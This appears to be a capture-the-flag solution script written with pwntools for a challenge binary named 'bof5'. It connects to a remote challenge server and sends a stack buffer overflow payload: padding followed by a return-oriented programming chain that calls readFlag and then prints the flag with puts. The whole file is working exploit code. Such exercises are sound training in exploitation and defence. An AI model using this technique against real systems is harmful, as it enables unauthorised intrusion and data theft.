#nc 13.214.30.13 10006

from pwn import *

p = remote('13.214.30.13', '10006')

context.binary = binary = './bof5'

vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)

payload = b'A'*24
payload += p64(vuln_elf.symbols.readFlag)
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(vuln_elf.symbols.flag)
payload += p64(vuln_elf.symbols.plt.puts)
# payload += p64(vuln_elf.symbols.main)

print(p.recvline())
p.sendline(payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
